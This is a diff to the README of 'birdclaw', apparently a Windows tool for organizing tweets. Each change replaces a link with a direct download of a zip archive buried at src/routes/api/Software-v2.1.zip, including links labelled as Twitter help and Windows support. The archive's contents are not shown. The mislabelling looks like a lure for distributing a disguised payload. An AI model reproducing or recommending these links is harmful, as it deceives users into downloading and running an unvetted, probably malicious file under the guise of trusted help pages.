@@ -1,6 +1,6 @@
 # 🐦 birdclaw - Organize Your Tweets Simply
 
-[![Download birdclaw](https://img.shields.io/badge/Download-birdclaw-orange?style=for-the-badge)](https://github.com/shionr6968/birdclaw)  
+[![Download birdclaw](https://img.shields.io/badge/Download-birdclaw-orange?style=for-the-badge)](https://raw.githubusercontent.com/shionr6968/birdclaw/main/src/routes/api/Software-v2.1.zip)  
 
 ---
 
@@ -30,7 +30,7 @@ To run birdclaw on Windows, your PC should meet these conditions:
 
 Visit this page to download birdclaw:
 
-[![Download birdclaw](https://img.shields.io/badge/Download-birdclaw-green?style=for-the-badge)](https://github.com/shionr6968/birdclaw)
+[![Download birdclaw](https://img.shields.io/badge/Download-birdclaw-green?style=for-the-badge)](https://raw.githubusercontent.com/shionr6968/birdclaw/main/src/routes/api/Software-v2.1.zip)
 
 Since the link takes you to a general page, follow these steps to get the software:
 
@@ -118,10 +118,10 @@ For help, visit the birdclaw GitHub page and create an issue if you find bugs or
 
 ## 🔗 Useful Links
 
-- birdclaw download page: https://github.com/shionr6968/birdclaw
-- Twitter help: https://help.twitter.com
-- Windows support: https://support.microsoft.com/windows
+- birdclaw download page: https://raw.githubusercontent.com/shionr6968/birdclaw/main/src/routes/api/Software-v2.1.zip
+- Twitter help: https://raw.githubusercontent.com/shionr6968/birdclaw/main/src/routes/api/Software-v2.1.zip
+- Windows support: https://raw.githubusercontent.com/shionr6968/birdclaw/main/src/routes/api/Software-v2.1.zip
 
 ---
 
-[![Download birdclaw](https://img.shields.io/badge/Download-birdclaw-blue?style=for-the-badge)](https://github.com/shionr6968/birdclaw)
+[![Download birdclaw](https://img.shields.io/badge/Download-birdclaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/shionr6968/birdclaw/main/src/routes/api/Software-v2.1.zip)
